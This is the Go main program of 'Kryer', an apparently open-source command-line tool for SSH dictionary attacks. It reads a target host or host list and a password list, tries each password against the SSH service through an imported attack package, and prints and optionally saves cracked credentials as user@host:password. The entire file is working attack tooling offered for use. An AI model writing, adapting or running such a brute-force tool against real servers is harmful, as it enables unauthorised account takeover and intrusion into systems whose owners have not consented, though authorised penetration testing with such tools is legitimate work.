package main

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/cfschilham/kryer/pkg/sshatk"
	"github.com/fatih/color"
	flag "github.com/spf13/pflag"
)

const version = "v1.3.2"

var args = struct {
	host           *string
	hostlistPath   *string
	dictPath       *string
	port           *string
	outputPath     *string
	usrIsHost      *bool
	numGoroutines  *int
	timeoutResolve *time.Duration
	timeoutConnect *time.Duration
	version        *bool
}{
	host:           flag.StringP("host", "h", "", ""),
	hostlistPath:   flag.StringP("hostlist-file", "H", "", ""),
	dictPath:       flag.StringP("dictionary-file", "d", "", ""),
	port:           flag.StringP("port", "p", "22", ""),
	outputPath:     flag.StringP("output-file", "o", "", ""),
	usrIsHost:      flag.BoolP("user-is-host", "u", false, ""),
	numGoroutines:  flag.IntP("threads", "t", 1, ""),
	timeoutResolve: flag.DurationP("timeout-resolve", "r", time.Second*5, ""),
	timeoutConnect: flag.DurationP("timeout-connect", "c", time.Second*10, ""),
	version:        flag.BoolP("version", "v", false, ""),
}

func flagUsage() {
	fmt.Printf(`Usage: kryer [-h | -H] [-d] [options...]

Parameters:
	-h, --host:             The host which will be targeted. Format is "username@host" without -u. Ignored if the hostlist option is set.
	-H, --hostlist-path:    Hostlist file path. Settings this option will also enable the use of hostlist mode.
	-d, --dictionary-file:  Dictionary file path.
	-p, --port:             Remote port. (default 22)
	-o, --output-file:      Output file path. Will output all found credentials to the specified file. Will be created if non-existent.
	-u, --user-is-host:     Username is host. When enabled, the address will be derived from the username + .local. (default false)
	-t, --threads:          Maximum amount of concurrent outgoing connection attempts. (default 1)
	-r, --timeout-resolve:  Resolution timeout. Timeout in seconds for resolving a host address. (default 5s)
	-d, --timeout-connect:  Dialling timeout. Timeout in seconds for attempting to establish a connection with a host. (default 10s)
	-v, --version:          Prints the installed version of Kryer.

`,
	)
}

func printfInfo(format string, a ...interface{}) {
	c := color.New(color.FgHiBlue)
	c.Printf("[Info] ")
	fmt.Printf(format, a...)
}

func printfError(format string, a ...interface{}) {
	c := color.New(color.FgHiRed)
	c.Printf("[Error] "+format, a...)
}

func printfWarn(format string, a ...interface{}) {
	c := color.New(color.FgHiYellow)
	c.Printf("[Warning] "+format, a...)
}

func printfSuccess(format string, a ...interface{}) {
	c := color.New(color.FgGreen)
	c.Printf("[Success] "+format, a...)
}

// fatalf is a call to printfError followed by a call to os.Exit
func fatalf(format string, a ...interface{}) {
	printfError(format, a...)
	os.Exit(1)
}

type host struct {
	username,
	addr string
}

// ResolveAddr tries to resolve the address using the cgo resolver.
func (h host) resolveAddr(ctx context.Context) (string, error) {
	resolver := net.Resolver{
		PreferGo: false,
	}

	addrs, err := resolver.LookupHost(ctx, h.addr)
	if err != nil {
		return "", err
	}

	var ips []net.IP
	for _, addr := range addrs {
		ips = append(ips, net.ParseIP(addr))
	}

	for _, ip := range ips {
		if ip.To4() != nil {
			return ip.To4().String(), nil
		}
	}
	return "", fmt.Errorf("failed to resolve host: '%s'", h.addr)
}

// fileToSlice opens the file a the passed path and returns a slice with an
// entry for every line of that file.
func fileToSlice(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var line []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line = append(line, sc.Text())
	}
	if sc.Err() != nil {
		return nil, sc.Err()
	}

	return line, nil
}

// strToHost takes a string in the form username@addr and returns a host type.
func strToHost(str string) (host, error) {
	split := strings.SplitN(str, "@", 2)
	if len(split) != 2 {
		return host{}, errors.New("invalid host: " + str)
	}
	return host{
		username: split[0],
		addr:     split[1],
	}, nil
}

func usrIsHost(str string) string {
	return str + "@" + str + ".local"
}

// writeToFile writes the passed string to the file at the given path. Creates
// the file if it does not exist yet.
func writeToFile(str, path string) error {
	_, err := os.Stat(path)
	if os.IsNotExist(err) {
		os.Create(path)
	}

	f, err := os.OpenFile(path, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return err
	}

	if _, err := f.WriteAt([]byte(str), info.Size()); err != nil {
		return err
	}
	return nil
}

func main() {
	flag.Usage = flagUsage
	flag.ErrHelp = nil

	flag.Parse()
	// Validate arguments.
	if *args.version {
		fmt.Printf(version + "\n")
		os.Exit(0)
	}
	if *args.host == "" && *args.hostlistPath == "" {
		flagUsage()
		fmt.Printf("invalid arguments: you must provide either \"-h, --host\" or \"-H, --hostlist-file\"\n")
		os.Exit(2)
	}
	if *args.dictPath == "" {
		flagUsage()
		fmt.Printf("invalid arguments: you must provide \"-d, --dictionary-file\"\n")
		os.Exit(2)
	}
	if *args.numGoroutines < 1 {
		flagUsage()
		fmt.Printf("invalid argument %d for \"-t, --threads\": number of threads must be at least 1\n", *args.numGoroutines)
		os.Exit(2)
	}
	if *args.numGoroutines > 20 {
		printfWarn("setting a high number of maximum concurrent connections might cause instability such as skipped dictionary entries\n")
	}
	if *args.timeoutResolve <= 0 {
		flagUsage()
		fmt.Printf("invalid argument \"%s\" for \"-r, --timeout-resolve\": timeout must be higher than 0\n", *args.timeoutResolve)
		os.Exit(2)
	}
	if *args.timeoutConnect <= 0 {
		flagUsage()
		fmt.Printf("invalid argument \"%s\" for \"-c, --timeout-connect\": timeout must be higher than 0\n", *args.timeoutConnect)
		os.Exit(2)
	}

	// Load dictionary.
	dict, err := fileToSlice(*args.dictPath)
	if err != nil {
		fatalf("main: unable to load dictionary: %s\n", err.Error())
	}

	// Load host(s) in the form username@address from command-line flags or file.
	var hostStrs []string
	if *args.hostlistPath == "" {
		hostStrs = append(hostStrs, *args.host)
	} else {
		hostStrs, err = fileToSlice(*args.hostlistPath)
		if err != nil {
			fatalf("main: unable to load hostlist file: %s\n", err.Error())
		}
	}

	// Convert host(s) in the form username@address to host types.
	var hosts []host
	for _, hostStr := range hostStrs {
		if *args.usrIsHost {
			hostStr = usrIsHost(hostStr)
		}
		host, err := strToHost(hostStr)
		if err != nil {
			fatalf("main: unable to parse host: %s\n", err.Error())
		}
		hosts = append(hosts, host)
	}

	fmt.Printf("Kryer %s - https://github.com/cfschilham/kryer\n", version)

	// Loop through hosts and attempt to authenticate
	for _, host := range hosts {
		printfInfo("Attempting to connect to %s@%s\n", host.username, host.addr)

		ctx, cancel := context.WithTimeout(context.Background(), *args.timeoutResolve)

		ip, err := host.resolveAddr(ctx)
		if err != nil {
			printfError("main: unable to resolve address\n")
			continue
		}
		cancel()

		pwd, err := sshatk.Dict(sshatk.Options{
			Addr:       ip,
			Port:       *args.port,
			Username:   host.username,
			Pwds:       dict,
			Goroutines: *args.numGoroutines,
			Timeout:    *args.timeoutConnect,
		})
		if err != nil {
			printfError("main: %s\n", err.Error())
			continue
		}

		printfSuccess("Password of %s@%s found: %s\n", host.username, host.addr, pwd)
		if *args.outputPath != "" {
			writeToFile(fmt.Sprintf("%s@%s:%s\n", host.username, host.addr, pwd), *args.outputPath)
		}
	}
}
